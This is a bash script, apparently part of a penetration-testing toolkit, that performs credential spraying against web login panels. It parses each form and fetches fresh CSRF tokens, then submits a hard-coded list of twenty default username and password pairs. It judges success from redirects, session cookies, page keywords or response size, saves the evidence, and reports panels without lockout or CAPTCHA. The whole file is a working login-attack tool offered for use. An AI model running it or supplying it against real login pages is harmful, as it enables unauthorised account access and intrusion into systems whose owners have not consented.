#!/usr/bin/env bash
# ╔══════════════════════════════════════════════════════════════╗
# ║  ac_login_spray.sh — Login Panel Credential Spray            ║
# ║  Form extraction · CSRF handling · Default cred testing ·    ║
# ║  Lockout detection · Rate limit audit                        ║
# ╚══════════════════════════════════════════════════════════════╝
set -uo pipefail

SCRIPT_NAME="ac_login_spray.sh"
SCRIPT_DESC="Login Panel Credential Spray"
SPRAY_DELAY=1

script_usage() {
    echo "Usage: ${SCRIPT_NAME} [OPTIONS]"
    echo ""
    echo "  Test login panels for default credentials, missing CAPTCHA,"
    echo "  and absent rate limiting. Sources ac_login_panels.txt from"
    echo "  URLS_FILE or OUT_DIR."
    echo ""
    echo "Options:"
    echo "  -d, --domain DOMAIN    Target domain"
    echo "  -u, --urls FILE        File with login panel URLs (one per line)"
    echo "  -o, --out DIR          Output directory (default: ./out)"
    echo "  -t, --threads N        Concurrency (default: 30)"
    echo "  -h, --help             Show this help"
}

LIB_DIR="$(cd "$(dirname "$0")/.." && pwd)"
source "${LIB_DIR}/lib.sh"
parse_common_args "$@"

phase_header "10" "$SCRIPT_DESC"

# ── Locate login panels file ──
PANELS_FILE=""
if [ -n "${URLS_FILE:-}" ] && [ -f "$URLS_FILE" ]; then
    PANELS_FILE="$URLS_FILE"
elif [ -f "${OUT_DIR}/ac_login_panels.txt" ]; then
    PANELS_FILE="${OUT_DIR}/ac_login_panels.txt"
fi

if [ -z "$PANELS_FILE" ] || [ ! -s "$PANELS_FILE" ]; then
    err "No login panels file found. Provide --urls or ensure ac_login_panels.txt exists in OUT_DIR."
    script_usage
    exit 1
fi

panel_count=$(count_lines "$PANELS_FILE")
info "Loaded ${panel_count} login panel(s) from ${PANELS_FILE}"

# ── Tool checks ──
if ! check_tool curl 2>/dev/null; then
    err "curl is required"
    exit 1
fi
if ! check_tool python3 2>/dev/null; then
    err "python3 is required"
    exit 1
fi

# ── Output file ──
FINDINGS_FILE="${OUT_DIR}/ac_login_spray_findings.txt"
> "$FINDINGS_FILE"
mkdir -p "${OUT_DIR}/login_spray"

# ── Credential pairs ──
CRED_PAIRS=(
    "admin:admin"
    "admin:password"
    "admin:Password1"
    "admin:123456"
    "admin:admin123"
    "root:root"
    "root:toor"
    "root:password"
    "root:123456"
    "test:test"
    "test:password"
    "test:123456"
    "guest:guest"
    "guest:password"
    "user:user"
    "user:password"
    "demo:demo"
    "demo:password"
    "operator:operator"
    "manager:manager"
)

# ══════════════════════════════════════════════════════════════
# Python helper: extract form structure from HTML
# ══════════════════════════════════════════════════════════════
FORM_EXTRACTOR='
import sys, re, json
from html.parser import HTMLParser

html = sys.stdin.read()

class FormParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.forms = []
        self.current_form = None

    def handle_starttag(self, tag, attrs):
        attrs_dict = dict(attrs)
        if tag == "form":
            self.current_form = {
                "action": attrs_dict.get("action", ""),
                "method": (attrs_dict.get("method", "POST")).upper(),
                "inputs": []
            }
        elif tag == "input" and self.current_form is not None:
            self.current_form["inputs"].append({
                "name": attrs_dict.get("name", ""),
                "type": (attrs_dict.get("type", "text")).lower(),
                "value": attrs_dict.get("value", "")
            })

    def handle_endtag(self, tag):
        if tag == "form" and self.current_form is not None:
            self.forms.append(self.current_form)
            self.current_form = None

parser = FormParser()
try:
    parser.feed(html)
except:
    pass

# If a form was opened but never closed, still capture it
if parser.current_form is not None:
    parser.forms.append(parser.current_form)

# Find the best login form: prioritize forms with password fields
best = None
for form in parser.forms:
    has_password = any(i["type"] == "password" for i in form["inputs"])
    if has_password:
        best = form
        break

if best is None and parser.forms:
    best = parser.forms[0]

if best is None:
    print("{}")
    sys.exit(0)

# Identify field roles
username_field = ""
password_field = ""
csrf_field = ""
csrf_value = ""
hidden_fields = {}

csrf_patterns = ["csrf", "_token", "authenticity_token", "__requestverificationtoken",
                 "csrfmiddlewaretoken", "anti-forgery", "xsrf"]

for inp in best["inputs"]:
    name = inp["name"]
    itype = inp["type"]
    value = inp["value"]
    name_lower = name.lower()

    # CSRF detection
    if any(p in name_lower for p in csrf_patterns):
        csrf_field = name
        csrf_value = value
        continue

    # Password field
    if itype == "password" and not password_field:
        password_field = name
        continue

    # Username/email field
    if not username_field and itype in ("text", "email", "tel", ""):
        if any(k in name_lower for k in ["user", "email", "login", "name", "account", "id", "uname"]):
            username_field = name
            continue

    # Hidden fields (carry them through)
    if itype == "hidden" and name and name != csrf_field:
        hidden_fields[name] = value

# Fallback: first text-ish field is username if not yet found
if not username_field:
    for inp in best["inputs"]:
        if inp["type"] in ("text", "email", "tel", "") and inp["name"] and inp["name"] != csrf_field:
            username_field = inp["name"]
            break

result = {
    "action": best["action"],
    "method": best["method"],
    "username_field": username_field,
    "password_field": password_field,
    "csrf_field": csrf_field,
    "csrf_value": csrf_value,
    "hidden_fields": hidden_fields
}
print(json.dumps(result))
'

# ══════════════════════════════════════════════════════════════
# Python helper: extract CSRF token from fresh page fetch
# ══════════════════════════════════════════════════════════════
CSRF_EXTRACTOR='
import sys, re, json
from html.parser import HTMLParser

html = sys.stdin.read()
field_name = sys.argv[1] if len(sys.argv) > 1 else ""

if not field_name:
    print("")
    sys.exit(0)

class CSRFParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.value = ""

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            attrs_dict = dict(attrs)
            if attrs_dict.get("name", "").lower() == field_name.lower():
                self.value = attrs_dict.get("value", "")

parser = CSRFParser()
try:
    parser.feed(html)
except:
    pass
print(parser.value)
'

# ══════════════════════════════════════════════════════════════
# Lockout / rate-limit keyword patterns
# ══════════════════════════════════════════════════════════════
LOCKOUT_PATTERNS="too many|rate limit|rate-limit|ratelimit|locked|locked out|account locked|blocked|captcha|recaptcha|hcaptcha|try again later|temporarily disabled|exceeded|throttle|slow down"

# ══════════════════════════════════════════════════════════════
# Process each login panel
# ══════════════════════════════════════════════════════════════
success_count=0
noratelimit_count=0
lockout_count=0

while IFS= read -r panel_url; do
    # Skip blank lines and comments
    [[ -z "$panel_url" ]] && continue
    [[ "$panel_url" =~ ^[[:space:]]*# ]] && continue

    info "Testing: ${panel_url}"

    # ── Step 1: Fetch page and extract form structure ──
    page_body=$(curl -sk --max-time 15 "${HUNT_UA_CURL[@]}" -D "${OUT_DIR}/login_spray/_headers.tmp" \
        -o - "$panel_url" 2>/dev/null || echo "")

    if [ -z "$page_body" ]; then
        warn "  Could not fetch page, skipping"
        continue
    fi

    form_json=$(echo "$page_body" | python3 -c "$FORM_EXTRACTOR" 2>/dev/null || echo "{}")

    if [ "$form_json" = "{}" ] || [ -z "$form_json" ]; then
        warn "  No login form detected, skipping"
        continue
    fi

    # Parse form fields
    form_action=$(echo "$form_json" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('action',''))" 2>/dev/null)
    form_method=$(echo "$form_json" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('method','POST'))" 2>/dev/null)
    username_field=$(echo "$form_json" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('username_field',''))" 2>/dev/null)
    password_field=$(echo "$form_json" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('password_field',''))" 2>/dev/null)
    csrf_field=$(echo "$form_json" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('csrf_field',''))" 2>/dev/null)
    csrf_value=$(echo "$form_json" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('csrf_value',''))" 2>/dev/null)
    hidden_fields_json=$(echo "$form_json" | python3 -c "import json,sys; d=json.load(sys.stdin); print(json.dumps(d.get('hidden_fields',{})))" 2>/dev/null)

    if [ -z "$username_field" ] || [ -z "$password_field" ]; then
        warn "  Could not identify username/password fields (u=${username_field:-?}, p=${password_field:-?}), skipping"
        continue
    fi

    log "  Form: action=${form_action:-self} method=${form_method} user_field=${username_field} pass_field=${password_field} csrf=${csrf_field:-none}"

    # ── Resolve form action to absolute URL ──
    if [ -z "$form_action" ] || [ "$form_action" = "" ]; then
        # Empty action means submit to the same URL
        submit_url="$panel_url"
    elif [[ "$form_action" =~ ^https?:// ]]; then
        # Absolute URL
        submit_url="$form_action"
    elif [[ "$form_action" =~ ^/ ]]; then
        # Root-relative path — extract base URL
        base_url=$(echo "$panel_url" | python3 -c "
import sys
from urllib.parse import urlparse
u = urlparse(sys.stdin.read().strip())
print(f'{u.scheme}://{u.netloc}')
" 2>/dev/null)
        submit_url="${base_url}${form_action}"
    else
        # Relative path — resolve against current URL directory
        parent_url=$(echo "$panel_url" | python3 -c "
import sys
from urllib.parse import urlparse, urljoin
print(urljoin(sys.stdin.read().strip(), sys.argv[1]))
" "$form_action" 2>/dev/null)
        submit_url="$parent_url"
    fi

    info "  Submit URL: ${submit_url}"

    # ── Build hidden field curl args ──
    hidden_args=()
    if [ "$hidden_fields_json" != "{}" ] && [ -n "$hidden_fields_json" ]; then
        while IFS='=' read -r hname hval; do
            [ -n "$hname" ] && hidden_args+=(-d "${hname}=${hval}")
        done < <(echo "$hidden_fields_json" | python3 -c "
import json, sys
d = json.load(sys.stdin)
for k, v in d.items():
    print(f'{k}={v}')
" 2>/dev/null)
    fi

    # ── Step 2: Check for CAPTCHA on the login page ──
    has_captcha=false
    if echo "$page_body" | grep -qiE 'recaptcha|hcaptcha|captcha|g-recaptcha|cf-turnstile|arkose|funcaptcha'; then
        has_captcha=true
        info "  CAPTCHA detected on login form"
    fi

    # ── Step 3: Get baseline failed login response ──
    # Use obviously-wrong creds to establish a baseline
    baseline_csrf_val="$csrf_value"
    if [ -n "$csrf_field" ]; then
        # Fetch a fresh page for the baseline to get a valid CSRF token
        baseline_page=$(curl -sk --max-time 15 "${HUNT_UA_CURL[@]}" \
            -c "${OUT_DIR}/login_spray/_cookies.tmp" \
            -o - "$panel_url" 2>/dev/null || echo "")
        if [ -n "$baseline_page" ]; then
            baseline_csrf_val=$(echo "$baseline_page" | python3 -c "$CSRF_EXTRACTOR" "$csrf_field" 2>/dev/null || echo "$csrf_value")
        fi
    fi

    baseline_post_args=(-d "${username_field}=xX_n0nexist3nt_Xx" -d "${password_field}=xX_rand0mfail99_Xx")
    [ -n "$csrf_field" ] && [ -n "$baseline_csrf_val" ] && baseline_post_args+=(-d "${csrf_field}=${baseline_csrf_val}")

    baseline_resp_file="${OUT_DIR}/login_spray/_baseline_body.tmp"
    baseline_hdr_file="${OUT_DIR}/login_spray/_baseline_hdrs.tmp"

    if [ "$form_method" = "GET" ]; then
        # Build query string for GET
        baseline_qs="${username_field}=xX_n0nexist3nt_Xx&${password_field}=xX_rand0mfail99_Xx"
        [ -n "$csrf_field" ] && [ -n "$baseline_csrf_val" ] && baseline_qs+="&${csrf_field}=${baseline_csrf_val}"
        curl -sk -D "$baseline_hdr_file" -o "$baseline_resp_file" --max-time 10 \
            "${HUNT_UA_CURL[@]}" \
            -b "${OUT_DIR}/login_spray/_cookies.tmp" \
            "${submit_url}?${baseline_qs}" 2>/dev/null || true
    else
        curl -sk -D "$baseline_hdr_file" -o "$baseline_resp_file" --max-time 10 \
            "${HUNT_UA_CURL[@]}" \
            -b "${OUT_DIR}/login_spray/_cookies.tmp" \
            -X POST "${baseline_post_args[@]}" "${hidden_args[@]+"${hidden_args[@]}"}" \
            "$submit_url" 2>/dev/null || true
    fi

    baseline_size=0
    if [ -f "$baseline_resp_file" ]; then
        baseline_size=$(wc -c < "$baseline_resp_file" 2>/dev/null | tr -d ' ' || echo 0)
    fi
    info "  Baseline failed-login response size: ${baseline_size} bytes"

    sleep "$SPRAY_DELAY"

    # ── Step 4: Spray credential pairs ──
    panel_locked=false
    spray_attempt=0

    for cred_pair in "${CRED_PAIRS[@]}"; do
        if $panel_locked; then
            break
        fi

        cred_user="${cred_pair%%:*}"
        cred_pass="${cred_pair#*:}"
        ((spray_attempt++)) || true

        # Fresh CSRF token if needed
        spray_csrf_val="$csrf_value"
        spray_cookies_file="${OUT_DIR}/login_spray/_spray_cookies.tmp"
        if [ -n "$csrf_field" ]; then
            fresh_page=$(curl -sk --max-time 15 "${HUNT_UA_CURL[@]}" \
                -c "$spray_cookies_file" \
                -o - "$panel_url" 2>/dev/null || echo "")
            if [ -n "$fresh_page" ]; then
                spray_csrf_val=$(echo "$fresh_page" | python3 -c "$CSRF_EXTRACTOR" "$csrf_field" 2>/dev/null || echo "$csrf_value")
            fi
        fi

        # Build POST/GET data
        spray_args=(-d "${username_field}=${cred_user}" -d "${password_field}=${cred_pass}")
        [ -n "$csrf_field" ] && [ -n "$spray_csrf_val" ] && spray_args+=(-d "${csrf_field}=${spray_csrf_val}")

        resp_file="${OUT_DIR}/login_spray/_spray_body.tmp"
        hdr_file="${OUT_DIR}/login_spray/_spray_hdrs.tmp"

        if [ "$form_method" = "GET" ]; then
            spray_qs="${username_field}=${cred_user}&${password_field}=${cred_pass}"
            [ -n "$csrf_field" ] && [ -n "$spray_csrf_val" ] && spray_qs+="&${csrf_field}=${spray_csrf_val}"
            curl -sk -D "$hdr_file" -o "$resp_file" --max-time 10 \
                "${HUNT_UA_CURL[@]}" \
                -b "$spray_cookies_file" \
                "${submit_url}?${spray_qs}" 2>/dev/null || true
        else
            curl -sk -D "$hdr_file" -o "$resp_file" --max-time 10 \
                "${HUNT_UA_CURL[@]}" \
                -b "$spray_cookies_file" \
                -X POST "${spray_args[@]}" "${hidden_args[@]+"${hidden_args[@]}"}" \
                "$submit_url" 2>/dev/null || true
        fi

        # Read response details
        resp_status="000"
        if [ -f "$hdr_file" ]; then
            resp_status=$(grep -oP 'HTTP/\S+\s+\K\d+' "$hdr_file" | tail -1 || echo "000")
        fi

        resp_body=""
        resp_size=0
        if [ -f "$resp_file" ]; then
            resp_body=$(cat "$resp_file" 2>/dev/null || echo "")
            resp_size=$(wc -c < "$resp_file" 2>/dev/null | tr -d ' ' || echo 0)
        fi

        resp_headers=""
        if [ -f "$hdr_file" ]; then
            resp_headers=$(cat "$hdr_file" 2>/dev/null || echo "")
        fi

        # ── Lockout detection ──
        resp_body_lower=$(echo "$resp_body" | tr '[:upper:]' '[:lower:]')
        if echo "$resp_body_lower" | grep -qiE "$LOCKOUT_PATTERNS"; then
            warn "  LOCKOUT detected at attempt ${spray_attempt} (${cred_user}:${cred_pass}) — stopping spray on this panel"
            echo "[HIGH] [LOCKOUT_DETECTED] ${panel_url} [at_attempt: ${spray_attempt}] [creds: ${cred_user}:${cred_pass}]" >> "$FINDINGS_FILE"
            panel_locked=true
            ((lockout_count++)) || true
            continue
        fi
        if [ "$resp_status" = "429" ]; then
            warn "  HTTP 429 rate limit at attempt ${spray_attempt} — stopping spray on this panel"
            echo "[HIGH] [LOCKOUT_DETECTED] ${panel_url} [at_attempt: ${spray_attempt}] [status: 429]" >> "$FINDINGS_FILE"
            panel_locked=true
            ((lockout_count++)) || true
            continue
        fi

        # ── Success detection ──
        detection_method=""

        # Check 1: Redirect (302/303) — likely to dashboard
        if [[ "$resp_status" =~ ^(302|303)$ ]]; then
            location=$(echo "$resp_headers" | grep -i '^location:' | head -1 | sed 's/^[^:]*:[[:space:]]*//' | tr -d '\r')
            # Only count as success if redirect is NOT back to login
            if [ -n "$location" ] && ! echo "$location" | grep -qiE 'login|signin|sign-in|auth|error|fail'; then
                detection_method="redirect_${resp_status}_to_${location}"
            fi
        fi

        # Check 2: Set-Cookie with session-like token
        if [ -z "$detection_method" ] && echo "$resp_headers" | grep -qiE 'set-cookie:.*(session|sess|sid|token|auth|jwt|access)'; then
            session_cookie=$(echo "$resp_headers" | grep -i '^set-cookie:' | grep -iE 'session|sess|sid|token|auth|jwt|access' | head -1 | sed 's/^[^:]*:[[:space:]]*//' | tr -d '\r')
            # Verify it's not just clearing a cookie (empty value or expires in past)
            if ! echo "$session_cookie" | grep -qiE '=;|=\s*;|expires=.*1970'; then
                detection_method="session_cookie"
            fi
        fi

        # Check 3: Response body contains success indicators
        if [ -z "$detection_method" ]; then
            if echo "$resp_body_lower" | grep -qiE 'dashboard|welcome|logout|my-account|myaccount|my_account|profile|"logged.in"|signed.in|sign.out|log.out'; then
                # Verify the baseline did NOT also contain these (to avoid false positives)
                if [ -f "$baseline_resp_file" ]; then
                    baseline_lower=$(tr '[:upper:]' '[:lower:]' < "$baseline_resp_file" 2>/dev/null || echo "")
                    if ! echo "$baseline_lower" | grep -qiE 'dashboard|welcome|logout|my-account|myaccount|my_account|profile|"logged.in"|signed.in|sign.out|log.out'; then
                        detection_method="body_success_keyword"
                    fi
                else
                    detection_method="body_success_keyword"
                fi
            fi
        fi

        # Check 4: Response body size significantly different from baseline (>30% change)
        if [ -z "$detection_method" ] && [ "$baseline_size" -gt 0 ] && [ "$resp_size" -gt 0 ]; then
            size_diff=$((resp_size - baseline_size))
            # Absolute difference
            if [ "$size_diff" -lt 0 ]; then
                size_diff=$(( -size_diff ))
            fi
            threshold=$(( baseline_size * 30 / 100 ))
            if [ "$size_diff" -gt "$threshold" ] && [ "$threshold" -gt 0 ]; then
                # Only flag if combined with a non-error status code
                if [[ "$resp_status" =~ ^(200|301|302|303)$ ]]; then
                    detection_method="body_size_diff_${resp_size}vs${baseline_size}"
                fi
            fi
        fi

        if [ -n "$detection_method" ]; then
            warn "  POSSIBLE LOGIN SUCCESS: ${cred_user}:${cred_pass} [status:${resp_status}] [detection:${detection_method}]"
            echo "[CRITICAL] ${panel_url} [creds: ${cred_user}:${cred_pass}] [status: ${resp_status}] [detection: ${detection_method}]" >> "$FINDINGS_FILE"
            ((success_count++)) || true

            # Save evidence
            evidence_dir="${OUT_DIR}/login_spray/evidence"
            mkdir -p "$evidence_dir"
            safe_host=$(echo "$panel_url" | sed 's|https\?://||;s|[/:?&=]|_|g' | head -c 80)
            cp "$hdr_file" "${evidence_dir}/${safe_host}_${cred_user}_headers.txt" 2>/dev/null || true
            cp "$resp_file" "${evidence_dir}/${safe_host}_${cred_user}_body.txt" 2>/dev/null || true
        fi

        sleep "$SPRAY_DELAY"
    done

    # ── Step 5: Rate limit / CAPTCHA audit ──
    # If we sprayed all 20 creds without hitting lockout and no CAPTCHA, flag it
    if ! $panel_locked && ! $has_captcha; then
        warn "  NO RATE LIMITING or CAPTCHA on: ${panel_url} (${spray_attempt} attempts without lockout)"
        echo "[HIGH] [NO_RATELIMIT] ${panel_url} [sprayed: ${spray_attempt} attempts, no lockout or CAPTCHA detected]" >> "$FINDINGS_FILE"
        ((noratelimit_count++)) || true
    elif ! $panel_locked && $has_captcha; then
        info "  CAPTCHA present but no server-side rate limiting detected after ${spray_attempt} attempts"
        # CAPTCHA mitigates client-side but note the finding at lower severity
        echo "[INFO] [CAPTCHA_ONLY] ${panel_url} [sprayed: ${spray_attempt} attempts, CAPTCHA present but no server-side rate limit]" >> "$FINDINGS_FILE"
    fi

done < "$PANELS_FILE"

# ══════════════════════════════════════════════════════════════
# Cleanup temp files
# ══════════════════════════════════════════════════════════════
rm -f "${OUT_DIR}/login_spray/_headers.tmp" \
      "${OUT_DIR}/login_spray/_cookies.tmp" \
      "${OUT_DIR}/login_spray/_baseline_body.tmp" \
      "${OUT_DIR}/login_spray/_baseline_hdrs.tmp" \
      "${OUT_DIR}/login_spray/_spray_body.tmp" \
      "${OUT_DIR}/login_spray/_spray_hdrs.tmp" \
      "${OUT_DIR}/login_spray/_spray_cookies.tmp" \
      2>/dev/null || true

# ══════════════════════════════════════════════════════════════
# Summary
# ══════════════════════════════════════════════════════════════
sort -u -o "$FINDINGS_FILE" "$FINDINGS_FILE" 2>/dev/null || true
total_findings=$(count_lines "$FINDINGS_FILE")

log "Login spray complete:"
log "  Panels tested:       ${panel_count}"
log "  Successful logins:   ${success_count} (CRITICAL)"
log "  No rate limiting:    ${noratelimit_count} (HIGH)"
log "  Lockouts triggered:  ${lockout_count}"
log "  Total findings:      ${total_findings}"
log "Results: ${FINDINGS_FILE}"

if [ "$success_count" -gt 0 ]; then
    warn "DEFAULT CREDENTIALS FOUND — see ${FINDINGS_FILE} for details"
    warn "Evidence saved to: ${OUT_DIR}/login_spray/evidence/"
fi
